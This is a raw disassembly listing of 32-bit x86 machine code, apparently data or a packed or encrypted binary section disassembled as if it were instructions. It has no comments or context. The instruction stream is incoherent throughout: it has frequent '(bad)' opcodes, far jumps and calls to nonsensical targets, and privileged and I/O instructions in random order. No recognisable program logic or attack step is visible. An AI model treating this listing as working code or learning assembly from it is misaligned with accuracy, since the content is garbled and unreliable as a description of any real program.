  41ca57:	xchg   eax,ebx
  41ca59:	mov    esi,0x7aabf6e7
  41ca5e:	jp     0x41ca0e
  41ca60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca61:	in     al,dx
  41ca62:	pop    edx
  41ca63:	add    cl,bh
  41ca65:	mov    eax,0x97634ef7
  41ca6a:	mov    bl,0xd9
  41ca6c:	pop    edx
  41ca6d:	and    DWORD PTR [eax+0x1d],ecx
  41ca70:	lock popf 
  41ca72:	jne    0x41cae8
  41ca74:	mov    fs,edx
  41ca76:	(bad)  
  41ca77:	dec    edx
  41ca78:	xor    eax,DWORD PTR [esi+0x19c5a4af]
  41ca7e:	xchg   al,bh
  41ca80:	loopne 0x41ca44
  41ca82:	xchg   ebp,eax
  41ca83:	xchg   esi,eax
  41ca84:	sbb    DWORD PTR [ebp+0x5b],ebx
  41ca87:	add    eax,0xa45663b5
  41ca8c:	and    bl,BYTE PTR [esi+0x22]
  41ca8f:	xor    edx,DWORD PTR [edi-0x33b351d]
  41ca95:	sbb    BYTE PTR ds:0x2636e4db,0x18
  41ca9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca9d:	dec    ebp
  41ca9e:	pop    ecx
  41ca9f:	adc    ebx,DWORD PTR [ebp+0x20]
  41caa2:	cmp    DWORD PTR [ecx-0x42],0x628a52ca
  41caa9:	(bad)  
  41caaa:	das    
  41caab:	xchg   DWORD PTR [edi+0x76],edx
  41caae:	loop   0x41ca88
  41cab0:	dec    edi
  41cab1:	xchg   ecx,eax
  41cab2:	nop
  41cab3:	xchg   edi,eax
  41cab4:	jnp    0x41ca3e
  41cab6:	add    BYTE PTR [esi+0x5fa24718],ch
  41cabc:	inc    esi
  41cabd:	retf   
  41cabe:	sub    BYTE PTR [ebp-0x69],ch
  41cac1:	sbb    eax,0x8422afec
  41cac6:	xchg   ebp,eax
  41cac7:	dec    ebp
  41cac8:	movzx  edx,WORD PTR [ebx]
  41cacb:	jmp    0xc08c5fd9
  41cad0:	mov    ch,BYTE PTR [edx-0x11280364]
  41cad6:	adc    al,0xb7
  41cad8:	outs   dx,BYTE PTR ds:[esi]
  41cad9:	adc    al,0xd7
  41cadb:	sbb    ebp,DWORD PTR [esi]
  41cadd:	mov    bl,0x33
  41cadf:	fldz   
  41cae1:	xor    eax,0x9ad5aca0
  41cae6:	test   ebp,edi
  41cae8:	or     dh,BYTE PTR [edi+edi*4]
  41caeb:	push   0xc46bc59d
  41caf0:	leave  
  41caf1:	sbb    bl,al
  41caf3:	mov    ds:0xd439597b,al
  41caf8:	neg    DWORD PTR [edi]
  41cafa:	xor    al,0x45
  41cafc:	or     DWORD PTR [eax+esi*1-0x8],edi
  41cb00:	jns    0x41caa1
  41cb02:	sbb    BYTE PTR [eax],cl
  41cb04:	jo     0x41cb11
  41cb06:	push   ebp
  41cb07:	jbe    0x41ca8d
  41cb09:	or     dh,BYTE PTR [ecx+0x40ccff29]
  41cb0f:	hlt    
  41cb10:	ror    DWORD PTR [eax-0x45e13053],cl
  41cb16:	(bad)
  41cb19:	jne    0x41cb0d
  41cb1b:	inc    esi
  41cb1c:	dec    eax
  41cb1d:	fdiv   QWORD PTR [ecx+edx*8-0x661c53e]
  41cb24:	out    dx,al
  41cb25:	int3   
  41cb26:	in     eax,dx
  41cb27:	nop
  41cb28:	outs   dx,DWORD PTR ds:[esi]
  41cb29:	ret    
  41cb2a:	shl    DWORD PTR [ebp+ebx*8+0x66cf5042],cl
  41cb31:	sub    BYTE PTR [ebx+0x54],0x3a
  41cb35:	ss jo  0x41cac1
  41cb38:	mov    ecx,0x7d03798f
  41cb3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb3e:	mov    bh,0x89
  41cb40:	sub    al,BYTE PTR [eax]
  41cb42:	pusha  
  41cb43:	js     0x41cb97
  41cb45:	outs   dx,BYTE PTR ds:[esi]
  41cb46:	ret    
  41cb47:	mov    ebx,0xe77cd0bb
  41cb4c:	add    eax,0xd5ac7c9a
  41cb51:	sbb    DWORD PTR [edi],esi
  41cb53:	xchg   ebp,eax
  41cb54:	jmp    0x851c:0xcee49737
  41cb5b:	ret    
  41cb5c:	loop   0x41cb04
  41cb5e:	inc    edx
  41cb5f:	imul   esp,edi,0xa325b61e
  41cb65:	push   esp
  41cb66:	nop
  41cb67:	call   0x6a700d32
  41cb6c:	pusha  
  41cb6d:	inc    ebx
  41cb6e:	outs   dx,BYTE PTR ds:[esi]
  41cb6f:	(bad)  
  41cb70:	mov    ebp,0xba1bbb9b
  41cb75:	xchg   ecx,eax
  41cb76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb77:	call   0x2220:0xf627e420
  41cb7e:	pop    ds
  41cb7f:	dec    esp
  41cb80:	xchg   esp,eax
  41cb81:	hlt    
  41cb82:	inc    ebp
  41cb83:	test   BYTE PTR [ebx+0x3b],dh
  41cb86:	icebp  
  41cb87:	mov    edx,0xb0ef3211
  41cb8c:	mov    ch,0xea
  41cb8e:	adc    ebx,0x5
  41cb91:	cmp    BYTE PTR [esi-0x71],bh
  41cb94:	stos   DWORD PTR es:[edi],eax
  41cb95:	sbb    DWORD PTR [eax+0x11],0x271b5e86
  41cb9c:	adc    ah,BYTE PTR [esi]
  41cb9e:	jns    0x41cb56
  41cba0:	popf   
  41cba1:	xlat   BYTE PTR ds:[ebx]
  41cba2:	rcr    BYTE PTR [edx+0x34],1
  41cba5:	and    BYTE PTR [esi+0x73362652],ch
  41cbab:	pop    esi
  41cbac:	mov    ah,0x79
  41cbae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbaf:	aas    
  41cbb0:	ret    
  41cbb1:	cmc    
  41cbb2:	fidiv  DWORD PTR [esi+eax*1-0x78]
  41cbb6:	fdivr  QWORD PTR [esi]
  41cbb8:	jnp    0x41cbc1
  41cbba:	push   0x2ceffb4a
  41cbbf:	ds push edi
  41cbc1:	mov    al,0xca
  41cbc3:	daa    
  41cbc4:	ret    
  41cbc5:	popa   
  41cbc6:	int3   
  41cbc7:	aad    0xd2
  41cbc9:	mov    esp,0x32328686
  41cbce:	cmc    
  41cbcf:	ins    BYTE PTR es:[edi],dx
  41cbd0:	lds    edx,FWORD PTR [esi+0x28]
  41cbd3:	clc    
  41cbd4:	fadd   DWORD PTR [edx]
  41cbd6:	cmp    al,0xd2
  41cbd8:	clc    
  41cbd9:	jg     0x41cc3c
  41cbdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbdc:	sub    DWORD PTR [edx-0x77],ebx
  41cbdf:	idiv   ch
  41cbe1:	dec    ebx
  41cbe2:	mov    ebp,0x3cc0c714
  41cbe7:	(bad)  
  41cbe8:	bound  ecx,QWORD PTR [ebx+ebx*4-0x20]
  41cbec:	xchg   esi,eax
  41cbed:	pop    eax
  41cbee:	imul   ebx,ebx,0x7b408d3f
  41cbf4:	shr    BYTE PTR [ebp-0x78],cl
  41cbf7:	sahf   
  41cbf8:	(bad)  
  41cbfa:	in     al,0x78
  41cbfc:	ins    DWORD PTR es:[edi],dx
  41cbfd:	stc    
  41cbfe:	int3   
  41cbff:	and    dl,BYTE PTR [ebx-0x6e]
  41cc02:	mov    cl,0xf6
  41cc04:	ds mov al,0xe2
  41cc07:	jp     0x41cc4c
  41cc09:	inc    ebp
  41cc0a:	pop    ss
  41cc0b:	xlat   BYTE PTR ds:[ebx]
  41cc0c:	dec    ecx
  41cc0d:	addr16 leave 
  41cc0f:	imul   esp,DWORD PTR [esi+0x50],0xffffffd6
  41cc13:	fucompp 
  41cc15:	fwait
  41cc16:	popf   
  41cc17:	mov    dh,0xaa
  41cc19:	pop    edi
  41cc1a:	add    cl,0xfc
  41cc1d:	dec    ecx
  41cc1e:	lea    esi,[eax]
  41cc20:	mov    fs,WORD PTR [ecx+0x3d510276]
  41cc26:	dec    esi
  41cc27:	sbb    BYTE PTR [ebp+0x777bd83e],ah
  41cc2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc2e:	sbb    eax,0x4fe7f354
  41cc33:	lahf   
  41cc34:	ds inc ebp
  41cc36:	or     edi,DWORD PTR [edi-0x53512f24]
  41cc3c:	pop    ds
  41cc3d:	xchg   esi,eax
  41cc3e:	adc    DWORD PTR [esi-0x4d],esp
  41cc41:	mov    cl,0x9b
  41cc43:	add    BYTE PTR [eax],0xb4
  41cc46:	es stos DWORD PTR es:[edi],eax
  41cc48:	inc    esi
  41cc49:	xchg   ecx,eax
  41cc4a:	cld    
  41cc4b:	pop    es
  41cc4c:	jecxz  0x41cc79
  41cc4e:	jne    0x41ccc6
  41cc50:	xchg   ebx,eax
  41cc51:	jl     0x41cbf0
  41cc53:	add    ebp,ecx
  41cc55:	jg     0x41ccc3
  41cc57:	shl    DWORD PTR [edi+0x7a],0x2e
  41cc5b:	addr16 push 0x4cd3450d
  41cc61:	hlt    
  41cc62:	inc    edi
  41cc63:	or     bl,bl
  41cc65:	stc    
  41cc66:	test   BYTE PTR [esi],0xae
  41cc69:	aad    0x3
  41cc6b:	(bad)  
  41cc6c:	xchg   ecx,eax
  41cc6d:	or     al,0xa7
  41cc6f:	iret   
  41cc70:	cmp    bl,bl
  41cc72:	lea    ebx,[esp+eax*1+0x3ed656c8]
  41cc79:	jmp    0x41cc1b
  41cc7b:	and    eax,0xc1b01c82
  41cc80:	stc    
  41cc81:	mov    ch,0xa1
  41cc83:	inc    edi
  41cc84:	mov    ebx,0x56ccaa66
  41cc89:	fisttp WORD PTR [ebx-0x68]
  41cc8c:	inc    esp
  41cc8d:	push   es
  41cc8e:	fnsave [esi-0x50]
  41cc91:	iret   
  41cc92:	lock push ebx
  41cc94:	ins    DWORD PTR es:[edi],dx
  41cc95:	push   edi
  41cc96:	and    DWORD PTR [ebx-0x658f7d],edi
  41cc9c:	mov    cl,0x4e
  41cc9e:	int    0x4f
  41cca0:	pusha  
  41cca1:	pop    ebx
  41cca2:	sti    
  41cca3:	dec    edx
  41cca4:	xchg   esp,eax
  41cca5:	mov    ds:0x815b3cb7,al
  41ccaa:	xchg   edi,eax
  41ccab:	bound  ecx,QWORD PTR [edi-0x67f24d1c]
  41ccb1:	or     BYTE PTR [edx+0x5e959d78],bl
  41ccb7:	jg     0x41cd05
  41ccb9:	or     BYTE PTR [ecx-0x236e1268],ah
  41ccbf:	hlt    
  41ccc0:	mov    edi,0x3a3f3c25
  41ccc5:	nop
  41ccc6:	lea    edi,[esi]
  41ccc8:	loope  0x41ccc4
  41ccca:	or     dl,bl
  41cccc:	push   esi
  41cccd:	mov    WORD PTR [esi-0x4d],cs
  41ccd0:	xlat   BYTE PTR ds:[ebx]
  41ccd1:	mov    dl,0x43
  41ccd3:	test   BYTE PTR [ebp+eiz*1-0x61f3eacb],ch
  41ccda:	inc    edx
  41ccdb:	cmp    BYTE PTR [eax+0x5970f085],cl
  41cce1:	cmovbe esi,DWORD PTR [edx+0x47]
  41cce5:	outs   dx,BYTE PTR ds:[esi]
  41cce6:	ficomp DWORD PTR [esi]
  41cce8:	pusha  
  41cce9:	fisub  DWORD PTR [edx]
  41cceb:	into   
  41ccec:	adc    eax,0xe38c53de
  41ccf1:	add    ch,al
  41ccf3:	imul   esi,DWORD PTR [ebx-0x3e],0x5a
  41ccf7:	inc    ecx
  41ccf8:	push   ss
  41ccf9:	mov    WORD PTR [eax+0x57],gs
  41ccfc:	and    edx,DWORD PTR [edx+0x7d]
  41ccff:	(bad)  
  41cd01:	pop    es
  41cd02:	popa   
  41cd03:	mov    eax,ds:0x770f265c
  41cd08:	icebp  
  41cd09:	nop
  41cd0a:	jmp    0x5fd8:0x6ec0ded7
  41cd11:	push   ds
  41cd12:	hlt    
  41cd13:	loopne 0x41cd28
  41cd15:	sub    edx,DWORD PTR [eax+0xc]
  41cd18:	mov    ebx,0xfa81cb5c
  41cd1d:	pop    edx
  41cd1e:	cmp    DWORD PTR [ebp-0x56dd527c],edi
  41cd24:	push   es
  41cd25:	inc    edx
  41cd26:	mov    cl,0x21
  41cd28:	stos   DWORD PTR es:[edi],eax
  41cd29:	aad    0xe6
  41cd2b:	mov    bh,0xa6
  41cd2d:	add    BYTE PTR [edx+eiz*1+0x401fa680],bh
  41cd34:	in     al,0x46
  41cd36:	mov    ebp,ss
  41cd38:	mov    ebx,0x3297c863
  41cd3d:	in     eax,dx
  41cd3e:	sub    ecx,0x1d
  41cd41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd42:	(bad)  
  41cd43:	stc    
  41cd44:	sub    eax,0xd50f9ec0
  41cd49:	jmp    0xbbc6:0xee5b11a0
  41cd50:	stc    
  41cd51:	repnz loopne 0x41cdb1
  41cd54:	mov    esi,DWORD PTR [ebp+0x3e60605d]
  41cd5a:	xchg   DWORD PTR [eax],esp
  41cd5c:	je     0x41cdc0
  41cd5e:	bound  esi,QWORD PTR [edi]
  41cd60:	dec    BYTE PTR [edi]
  41cd62:	sub    DWORD PTR [ecx+0x48f001b5],edx
  41cd68:	test   DWORD PTR [esi],edx
  41cd6a:	fs pop ecx
  41cd6c:	dec    edi
  41cd6d:	call   0x57b08960
  41cd72:	mov    dh,0xef
  41cd74:	data16 jbe 0x41cd44
  41cd77:	test   al,dh
  41cd79:	loopne 0x41cde3
  41cd7b:	lods   eax,DWORD PTR ds:[esi]
  41cd7c:	xlat   BYTE PTR ds:[ebx]
  41cd7d:	jnp    0x41cd6e
  41cd7f:	stos   BYTE PTR es:[edi],al
  41cd80:	retf   
  41cd81:	daa    
  41cd82:	outs   dx,DWORD PTR ds:[esi]
  41cd83:	inc    edx
  41cd84:	aad    0x4
  41cd86:	(bad)
  41cd8a:	pop    edi
  41cd8b:	and    dl,ch
  41cd8d:	fmul   QWORD PTR [eax+0x24]
  41cd90:	cli    
  41cd91:	pop    esp
  41cd92:	sar    BYTE PTR [edi-0x27],cl
  41cd95:	mov    al,ds:0xc39adac9
  41cd9a:	cmp    BYTE PTR [edi-0x2b04e0a5],dh
  41cda0:	mov    al,ds:0xbcce45b2
  41cda5:	mov    edx,0xafb93321
  41cdaa:	mov    esi,0x3fe076ff
  41cdaf:	or     edi,DWORD PTR [edi]
  41cdb1:	mov    esi,0xece28753
  41cdb6:	jecxz  0x41cde4
  41cdb8:	dec    eax
  41cdb9:	lea    edi,[edx-0x12fd8712]
  41cdbf:	(bad)  
  41cdc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdc1:	push   ecx
  41cdc2:	xchg   dl,dh
  41cdc4:	jecxz  0x41cd8f
  41cdc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdc7:	int3   
  41cdc8:	shl    BYTE PTR [eax-0x39748e30],1
  41cdce:	pop    esi
  41cdcf:	daa    
  41cdd0:	in     eax,0x7f
  41cdd2:	and    BYTE PTR [edx+0x303e73e1],dl
  41cdd8:	cmp    al,0x73
  41cdda:	push   ebp
  41cddb:	mov    eax,ds:0x11e9b089
  41cde0:	inc    ebx
  41cde1:	in     eax,0x22
  41cde3:	pop    edi
  41cde4:	imul   ebx,DWORD PTR [esi+0x43],0x7
  41cde8:	rol    DWORD PTR [ecx+0x1009e4f4],0xa4
  41cdef:	and    DWORD PTR [edi],eax
  41cdf1:	js     0x41ce19
  41cdf3:	jmp    0x41ce56
  41cdf5:	mov    eax,ds:0x69848fc2
  41cdfa:	fwait
  41cdfb:	sub    eax,0xd9041e0d
  41ce00:	fisttp DWORD PTR [eax]
  41ce02:	mov    WORD PTR [esi+0x1f971e1a],ds
  41ce08:	jb     0x41ce83
  41ce0a:	mov    bl,0x5
  41ce0c:	add    eax,0xac85a352
  41ce11:	lock lahf 
  41ce13:	inc    ecx
  41ce14:	into   
  41ce15:	xor    dl,BYTE PTR [eax-0x4a]
  41ce18:	stos   BYTE PTR es:[edi],al
  41ce19:	mov    ds:0x3d00c488,eax
  41ce1e:	mov    ds:0xcf7abb67,eax
  41ce23:	pmaxsw mm4,mm7
  41ce26:	clc    
  41ce27:	inc    edx
  41ce28:	jecxz  0x41cea0
  41ce2a:	call   FWORD PTR [esi+ebx*4]
  41ce2d:	mov    eax,0xf2196115
  41ce32:	jg     0x41cea0
  41ce34:	add    ebx,DWORD PTR [edi]
  41ce36:	mov    DWORD PTR [ecx+0x1],esp
  41ce39:	lea    edi,[eax-0x3d]
  41ce3c:	xchg   edx,eax
  41ce3d:	dec    ebp
  41ce3e:	retf   
  41ce3f:	(bad)
  41ce43:	ins    BYTE PTR es:[edi],dx
  41ce44:	mov    ah,0x46
  41ce46:	dec    edx
  41ce47:	enter  0xcc5b,0x2f
  41ce4b:	ja     0x41ce29
  41ce4d:	push   edx
  41ce4e:	inc    edi
  41ce4f:	ss out dx,eax
  41ce51:	cmp    eax,0x1bb72cac
  41ce56:	inc    ebx
  41ce57:	lock jnp 0x41ce5e
  41ce5a:	sub    dh,bh
  41ce5c:	push   edi
  41ce5d:	aaa    
  41ce5e:	int3   
  41ce5f:	lea    esp,[ebp-0x16ed4c47]
  41ce65:	test   BYTE PTR [edi-0x18],cl
  41ce68:	pop    ecx
  41ce69:	xor    eax,0x9be6bf40
  41ce6e:	mov    ah,0x8c
  41ce70:	mov    dl,BYTE PTR [esi]
  41ce72:	pop    dx
  41ce74:	mov    cl,0x2d
  41ce76:	insertq xmm1,(bad),0x78,0x4e
  41ce7a:	sub    eax,DWORD PTR [esp+ecx*2]
  41ce7d:	jp     0x41ce48
  41ce7f:	out    0x27,eax
  41ce81:	addr16 sti 
  41ce83:	fcom   QWORD PTR [edi+ecx*4+0x13]
  41ce87:	mov    bl,BYTE PTR [ebx]
  41ce89:	imul   DWORD PTR [edi]
  41ce8b:	xor    al,0x10
  41ce8d:	inc    ecx
  41ce8e:	pop    ds
  41ce8f:	out    0xc4,al
  41ce91:	je     0x41cf06
  41ce93:	(bad)  
  41ce94:	push   esp
  41ce95:	or     edi,DWORD PTR cs:[ebx]
  41ce98:	mov    DWORD PTR [esi],0x42d51a25
  41ce9e:	scas   al,BYTE PTR es:[edi]
  41ce9f:	pop    edi
  41cea0:	std    
  41cea1:	inc    edx
  41cea2:	repnz repnz xchg ebp,eax
  41cea5:	pcmpgtb mm2,QWORD PTR [edi-0x4329a86]
  41ceac:	mov    bh,0x2
  41ceae:	xchg   esi,eax
  41ceaf:	mov    ?,ebx
  41ceb1:	fadd   QWORD PTR [edx+0x6f4283d2]
  41ceb7:	push   DWORD PTR [ecx-0x7c]
  41ceba:	pop    ds
  41cebb:	dec    eax
  41cebc:	xor    DWORD PTR [eax-0x34],edi
  41cebf:	push   ebp
  41cec0:	repz add al,0xf8
  41cec3:	ret    0x4ea
  41cec6:	xor    cl,0x20
  41cec9:	out    dx,eax
  41ceca:	outs   dx,DWORD PTR ds:[esi]
  41cecb:	or     al,0x4d
  41cecd:	(bad)  
  41cece:	int    0x70
  41ced0:	mov    dh,0x52
  41ced2:	scas   al,BYTE PTR es:[edi]
  41ced3:	ja     0x41ce7e
  41ced5:	push   esi
  41ced6:	xor    ch,bh
  41ced8:	repz mov al,0x80
  41cedb:	adc    cl,BYTE PTR [edi+0x1f]
  41cede:	dec    esp
  41cedf:	cmp    esp,DWORD PTR [ebx+0x1b]
  41cee2:	into   
  41cee3:	lea    esp,[esp+ebx*8-0x2192353c]
  41ceea:	test   eax,0xe42ed7d3
  41ceef:	pop    ds
  41cef0:	pusha  
  41cef1:	push   ss
  41cef2:	cmova  esp,DWORD PTR [ebx+0x23]
  41cef6:	test   ebx,esp
  41cef8:	mov    al,ds:0xcd686401
  41cefd:	push   eax
  41cefe:	and    dl,BYTE PTR [ebp+0x6cfaf9dd]
  41cf04:	ins    BYTE PTR es:[edi],dx
  41cf05:	pop    eax
  41cf06:	ins    BYTE PTR es:[edi],dx
  41cf07:	retf   0x1edb
  41cf0a:	shl    dh,cl
  41cf0c:	adc    eax,0xe69bcea5
  41cf11:	sub    eax,DWORD PTR [ebx]
  41cf13:	sbb    esi,DWORD PTR [ecx-0x28]
  41cf16:	pop    ss
  41cf17:	mov    esp,0xbfb22942
  41cf1c:	push   ss
  41cf1d:	out    0x69,al
  41cf1f:	gs inc edi
  41cf21:	iret   
  41cf22:	ins    BYTE PTR es:[edi],dx
  41cf23:	cmp    cl,bh
  41cf25:	in     eax,dx
  41cf26:	(bad)  
  41cf27:	outs   dx,BYTE PTR ds:[esi]
  41cf28:	mov    BYTE PTR [eax-0x2c689950],ch
  41cf2e:	into   
  41cf2f:	in     eax,dx
  41cf30:	adc    eax,0xf5321059
  41cf35:	push   0x40
  41cf37:	test   DWORD PTR [ebx+esi*4-0x49ff8e89],esi
  41cf3e:	inc    ebp
  41cf3f:	and    al,0x23
  41cf41:	cmc    
  41cf42:	and    eax,esp
  41cf44:	xor    BYTE PTR [edi],dl
  41cf46:	push   ebx
  41cf47:	lahf   
  41cf48:	nop
  41cf49:	jge    0x41cf69
  41cf4b:	jae    0x41cf2c
  41cf4d:	daa    
  41cf4e:	cwde   
  41cf4f:	hlt    
  41cf50:	mov    bh,0x57
  41cf52:	int3   
  41cf53:	push   esp
  41cf54:	xor    BYTE PTR [edx],ch
  41cf56:	push   esi
  41cf57:	jb     0x41cf5b
  41cf59:	pop    ebp
  41cf5a:	jnp    0x41cf90
  41cf5c:	dec    edi
  41cf5d:	outs   dx,DWORD PTR ds:[esi]
  41cf5e:	add    al,ah
  41cf60:	ret    
  41cf61:	xor    DWORD PTR [ebp-0x72fc93d5],0xf398d2bf
  41cf6b:	jge    0x41cf99
  41cf6d:	fild   QWORD PTR [eax]
  41cf6f:	or     BYTE PTR [edi+esi*1],bl
  41cf72:	or     eax,esi
  41cf74:	push   ss
  41cf75:	jle    0x41cf2b
  41cf77:	pop    ds
  41cf78:	es sti 
  41cf7a:	popf   
  41cf7b:	in     eax,dx
  41cf7c:	test   eax,0xea76dac9
  41cf81:	cdq    
  41cf82:	or     bl,BYTE PTR [eax+0x6f]
  41cf85:	loope  0x41cf38
  41cf87:	cdq    
  41cf88:	jge    0x41cfba
  41cf8a:	inc    eax
  41cf8b:	sbb    BYTE PTR [eax],ah
  41cf8d:	or     al,0xad
  41cf8f:	daa    
  41cf90:	mov    ds:0x53576f0e,eax
  41cf95:	mov    edi,0x1bb66528
  41cf9a:	ds retf 
  41cf9c:	jmp    0x8554:0x4f853210
  41cfa3:	sub    edi,eax
  41cfa5:	jmp    0xad44:0xa9e30f1c
  41cfac:	jmp    0x8c86:0x8f0a5067
  41cfb3:	ror    bh,1
  41cfb5:	aaa    
  41cfb6:	mov    esi,0x1f8e9629
  41cfbb:	cwde   
  41cfbc:	outs   dx,DWORD PTR ds:[esi]
  41cfbd:	dec    esp
  41cfbe:	(bad)  
  41cfbf:	push   esp
  41cfc0:	cmp    eax,0x1553518d
  41cfc5:	arpl   WORD PTR [edi],cx
  41cfc7:	lods   eax,DWORD PTR ds:[esi]
  41cfc8:	lods   eax,DWORD PTR ds:[esi]
  41cfc9:	popf   
  41cfca:	mov    al,0x31
  41cfcc:	jle    0x41cf9b
  41cfce:	(bad)  
  41cfcf:	fwait
  41cfd0:	xchg   DWORD PTR [eax+0x45828cfe],esi
  41cfd6:	push   ds
  41cfd7:	mov    ebp,0x5ed076ad
  41cfdc:	inc    edi
  41cfdd:	xor    BYTE PTR [edx+0xb],dh
  41cfe0:	sbb    edx,eax
  41cfe2:	out    dx,al
  41cfe3:	and    al,BYTE PTR [ecx]
  41cfe5:	cs (bad) 
  41cfe8:	scas   eax,DWORD PTR es:[edi]
  41cfe9:	pop    ebp
  41cfea:	test   eax,0xae404df1
  41cfef:	test   DWORD PTR [edi+0x1f],edx
  41cff2:	sti    
  41cff3:	in     eax,0xfe
  41cff5:	sub    bl,BYTE PTR gs:[edi]
  41cff8:	ja     0x41d062
  41cffa:	in     al,0x56
  41cffc:	jle    0x41cf81
  41cffe:	cmp    bh,al
  41d000:	in     al,0x1d
  41d002:	(bad)  
  41d003:	das    
  41d004:	and    bl,dl
  41d006:	lea    ebx,ds:0x8f918645
  41d00c:	mov    al,ds:0x2414c3d7
  41d011:	xor    DWORD PTR [esi+0x53302a8],ebp
  41d017:	popf   
  41d018:	pop    ds
  41d019:	add    bh,bl
  41d01b:	sub    BYTE PTR [ecx-0x442b52d5],ch
  41d021:	nop
  41d022:	test   eax,0xd59e1831
  41d027:	jl     0x41d07a
  41d029:	adc    ch,BYTE PTR [eax+0x3f578eff]
  41d02f:	scas   eax,DWORD PTR es:[edi]
  41d030:	pop    ecx
  41d031:	dec    edi
  41d032:	push   0xbf7bdb29
  41d037:	mov    esp,0x12da2587
  41d03c:	aam    0x42
  41d03e:	inc    esp
  41d03f:	fs call 0x9dee:0xcd44a4c4
  41d047:	mov    esi,0x1e4a07c6
  41d04c:	scas   eax,DWORD PTR es:[edi]
  41d04d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d04e:	lahf   
  41d04f:	lea    eax,[edx+0x1a]
  41d052:	mov    al,ds:0xef52c679
  41d057:	daa    
  41d058:	hlt    
  41d059:	jmp    0x3b74:0x40fcac97
  41d060:	sub    eax,0xf2003c2b
  41d065:	in     eax,0xeb
  41d067:	pusha  
  41d068:	mov    ebx,0x190504e9
  41d06d:	gs or  al,0x52
  41d070:	or     al,0x8a
  41d072:	and    bh,BYTE PTR [eax+0x180e3c56]
  41d078:	adc    BYTE PTR [esi-0x13],al
  41d07b:	dec    edx
  41d07c:	repz and al,dl
  41d07f:	rcr    BYTE PTR [edi-0xb],cl
  41d082:	fldenv [esi+0x1]
  41d085:	cwde   
  41d086:	mov    bh,0x55
  41d088:	jecxz  0x41d0e9
  41d08a:	sbb    eax,0x5c40e49d
  41d08f:	call   0x7b36888
  41d094:	stos   DWORD PTR es:[edi],eax
  41d095:	add    dh,cl
  41d097:	sbb    al,0x40
  41d099:	push   esi
  41d09a:	mov    eax,0x2490ad1c
  41d09f:	popf   
  41d0a0:	(bad)  
  41d0a1:	pop    esp
  41d0a2:	and    ah,BYTE PTR ds:0xf18e761c
  41d0a8:	loop   0x41d098
  41d0aa:	adc    BYTE PTR [esi+0x7d55808f],bl
  41d0b0:	cmp    eax,0x6d4dfa9
  41d0b5:	xchg   ch,ch
  41d0b7:	or     ebp,DWORD PTR [ecx-0x76764c2]
  41d0bd:	push   ebp
  41d0be:	pushf  
  41d0bf:	ins    DWORD PTR es:[edi],dx
  41d0c0:	mov    dl,0x8
  41d0c2:	push   esi
  41d0c3:	mov    ds:0x1f9abd1f,al
  41d0c8:	aad    0xb2
  41d0ca:	pop    edi
  41d0cb:	gs ret 0x1e86
  41d0cf:	jne    0x41d0fe
  41d0d1:	xor    BYTE PTR [esi+0x3b],0x6f
  41d0d5:	adc    BYTE PTR [esi],dh
  41d0d7:	mov    bl,0x1d
  41d0d9:	add    dl,ah
  41d0db:	pop    ss
  41d0dc:	aaa    
  41d0dd:	repz sar DWORD PTR [eax],0x0
  41d0e1:	mov    bl,0xf9
  41d0e3:	jmp    0x41d14c
  41d0e5:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0e7:	rcl    BYTE PTR [eax],cl
  41d0e9:	aaa    
  41d0ea:	sub    BYTE PTR ds:0x3b10c831,0x16
  41d0f1:	pop    ecx
  41d0f2:	retf   
  41d0f3:	call   0xfd9ce6f9
  41d0f8:	bound  ecx,QWORD PTR [esi]
  41d0fa:	aas    
  41d0fb:	adc    ebx,DWORD PTR [ebx]
  41d0fd:	add    ebx,DWORD PTR [edi]
  41d0ff:	and    eax,0x87f90c88
  41d104:	jp     0x41d09c
  41d106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d107:	jp     0x41d145
  41d109:	in     eax,dx
  41d10a:	lahf   
  41d10b:	neg    ebx
  41d10d:	push   eax
  41d10e:	jb     0x41d09b
  41d110:	xor    DWORD PTR [esi-0x47584be2],0x46
  41d117:	cmc    
  41d118:	fs or  eax,eax
  41d11b:	aam    0x53
  41d11d:	mov    esp,0x41a2ad91
  41d122:	add    al,0x7d
  41d124:	std    
  41d125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d126:	fild   WORD PTR [ebp+0x65901928]
  41d12c:	pop    ds
  41d12d:	push   ebx
  41d12e:	fisub  WORD PTR [esi]
  41d130:	pop    ecx
  41d131:	jno    0x41d0d4
  41d133:	jmp    0xb265:0x7cfd572d
  41d13a:	xor    BYTE PTR [ebx-0x3e],dl
  41d13d:	rcl    ecx,cl
  41d13f:	jle    0x41d148
  41d141:	mov    cl,ah
  41d143:	mov    ch,0x1b
  41d145:	shr    DWORD PTR [ecx+0x76a34794],0xc6
  41d14c:	mov    esi,0xa95b8c20
  41d151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d152:	push   esp
  41d153:	push   ss
  41d154:	jns    0x41d161
  41d156:	add    BYTE PTR [ebp-0x7458c5ac],cl
  41d15c:	dec    ecx
  41d15d:	push   ss
  41d15e:	out    0x52,ax
  41d161:	test   ecx,0x77fa12d3
  41d167:	call   0x5ab0:0x1e98e42d
  41d16e:	into   
  41d16f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d170:	lods   eax,DWORD PTR ds:[esi]
  41d171:	and    eax,0xb7afdb79
  41d176:	sbb    dh,dh
  41d178:	or     esp,DWORD PTR [eax]
  41d17a:	fnsave [edi+0x670b1a3]
  41d180:	retf   0x68ed
  41d183:	mov    ?,WORD PTR [esi]
  41d185:	jno    0x41d16b
  41d187:	(bad)  
  41d188:	icebp  
  41d189:	mov    ecx,0x9331141c
  41d18e:	ins    DWORD PTR es:[edi],dx
  41d18f:	pop    ebx
  41d190:	int    0xe3
  41d192:	fcmovnb st,st(7)
  41d194:	mov    ah,0x11
